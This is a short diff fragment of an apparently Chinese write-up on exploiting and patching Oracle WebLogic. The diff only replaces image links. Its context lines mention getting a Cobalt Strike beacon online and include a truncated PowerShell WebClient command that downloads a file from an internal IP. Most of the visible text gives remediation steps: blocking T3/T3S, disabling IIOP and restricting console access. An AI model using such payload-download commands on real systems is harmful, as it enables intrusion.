-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibAib6hWKxgL8x7KVAhWQPfEf19EXxvGqKB8quFiabTzCWe3Nk6vYjpPZw/640?wx_fmt=png)
+![](../../.resource/remote/c712cc90a89375afd0b66f7b5120c75719b2db619c4afa26b27c272fb39f72cf.png)
 
 成功上线 CS
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib3ELOHCjufuAianVUlZ3RqRR7RZicjSReD6Eufjyg0Foibk1fib6acViaWcg/640?wx_fmt=png)
+![](../../.resource/remote/bccb1064308ea50e131d7dda2507ee4414e294fb197bf7fd10dadb04cc5a8a31.png)
 
 **漏洞修复**
 
 1. 禁用 T3 协议，如果您不依赖 T3 协议进行 JVM 通信，可通过暂时阻断 T3 协议缓解此漏洞带来的影响。首先进入 Weblogic 控制台，在 base_domain 配置页面中，进入 “安全” 选项卡页面，点击“筛选器”，配置筛选器。在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则框中输入：* * 7001 deny t3 t3s
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibPAc7djZia8w9BicJbtMzV7oqibWMEDTCEsckl4bEQntYt5VXatL4MwiaTg/640?wx_fmt=png)
+![](../../.resource/remote/4787328448005bca7ddc0ef367773e1965b68c995d48d78a5e4d03f3bb604331.png)
 
 2. 禁止启用 IIOP 协议。登陆 Weblogic 控制台，找到启用 IIOP 选项，取消勾选后重启生效
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibUHfbTfppzvuFy4ffXUl6hAzmh6c5PibN0nWjyct8o1Tm2mvMe68Ru2A/640?wx_fmt=png)
+![](../../.resource/remote/6a51f0d7d16ecbcbf18b474cbe8042fc3cd476c1e472104d70f124182c4cd8a1.png)
 
 3. 临时关闭后台 / console/console.portal 对外访问
 
@@ -1466,7 +1466,7 @@ powershell /c (new-object System.Net.WebClient).DownloadFile('http://192.168.0.1
 
 ### **0x04 **知识星球****
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/pH5fZ5lvwwZjRbPjHMwuywOjARoC8AlmuhOC1cKYYfDib2F2ibZkTpxEwic5mib3pKaaOKa6DDKwLMMibVKmxth4ogQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/409b0e82762d87ba3cc9bbdb168654cdbb0ef34798f03e3007aea6cd254b44dd.jpg)
 
 ---
 
